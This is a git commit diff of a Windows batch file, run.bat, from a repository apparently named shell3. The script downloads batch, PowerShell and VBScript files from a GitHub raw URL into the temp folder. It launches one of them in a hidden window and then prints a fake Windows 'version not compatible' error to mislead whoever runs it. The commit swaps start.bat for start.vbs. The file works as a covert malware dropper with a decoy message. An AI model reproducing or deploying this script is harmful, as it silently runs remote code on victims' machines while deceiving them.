114517deae03d47381ddb93d61a76d84296d2bb6
Omar Samy <osamy7592@gmail.com>
2024-05-14 01:20:18 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,7 @@
 @echo off
 curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/pro.bat -o "%temp%\pro.bat"
 curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/sh.ps1 -o "%temp%\sh.ps1"
-curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/start.bat -o "%temp%\start.bat"
+curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/start.vbs -o "%temp%\start.vbs"
 powershell -c "Start-Process -FilePath "%temp%\pro.bat" -WindowStyle Hidden"
 echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
 timeout /t 2 >nul
